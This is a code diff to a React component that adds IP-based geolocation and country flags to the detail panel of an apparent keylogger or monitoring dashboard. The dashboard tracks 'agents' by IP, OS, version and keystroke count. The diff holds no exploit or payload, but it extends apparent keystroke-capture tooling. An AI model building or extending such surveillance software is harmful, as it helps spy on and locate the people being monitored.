@@ -2,6 +2,7 @@ import { useState, useCallback, useRef, useEffect } from "react";
 import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer } from "recharts";
 import type { Agent, KeystrokeEntry, AgentConfig } from "../types";
 import { api } from "../services/api";
+import { getGeo } from "../services/geo";
 
 interface AgentDetailPanelProps {
   agent: Agent;
@@ -19,6 +20,17 @@ export function AgentDetailPanel({ agent, entries, activityData, onDelete, lates
   const [tagInput, setTagInput] = useState("");
   const [filterQuery, setFilterQuery] = useState("");
   const [syncState, setSyncState] = useState<"idle" | "syncing" | "synced" | "error">("idle");
+  const [geo, setGeo] = useState<{ country: string; countryCode: string; city: string } | null>(null);
+  const [geoDone, setGeoDone] = useState(false);
+
+  useEffect(() => {
+    setGeo(null);
+    setGeoDone(false);
+    getGeo(agent.ip).then((result) => {
+      if (result) setGeo({ country: result.country, countryCode: result.countryCode, city: result.city });
+      setGeoDone(true);
+    });
+  }, [agent.ip]);
 
   const intervalDebounce = useRef<number | null>(null);
   const blacklistDebounce = useRef<number | null>(null);
@@ -134,7 +146,10 @@ export function AgentDetailPanel({ agent, entries, activityData, onDelete, lates
                 fontWeight: 600,
               }}
             >
-              {agent.hostname}
+              {geo?.countryCode ? String.fromCodePoint(
+                geo.countryCode.toUpperCase().charCodeAt(0) + 0x1F1E6 - 65,
+                geo.countryCode.toUpperCase().charCodeAt(1) + 0x1F1E6 - 65,
+              ) + ' ' : ''}{agent.hostname}
             </h2>
           </div>
           <span
@@ -154,11 +169,12 @@ export function AgentDetailPanel({ agent, entries, activityData, onDelete, lates
         <div className="flex gap-6 mt-2">
           {[
             { label: "IP", value: agent.ip },
+            geo ? { label: "LOCATION", value: `${geo.city}, ${geo.country}` } : null,
             { label: "OS", value: agent.os },
             { label: "VERSION", value: `v${agent.version}` },
             { label: "LAST SEEN", value: agent.lastSeen },
             { label: "KEYSTROKES", value: agent.keystrokeCount.toLocaleString() },
-          ].map((item) => {
+          ].filter((item): item is NonNullable<typeof item> => item !== null && item.value !== null).map((item) => {
             const isVersion = item.label === "VERSION";
             const isLatest = isVersion && latestVersion && agent.version === latestVersion;
             const versionColor = isVersion ? (isLatest ? "#3fb950" : "#d29922") : undefined;
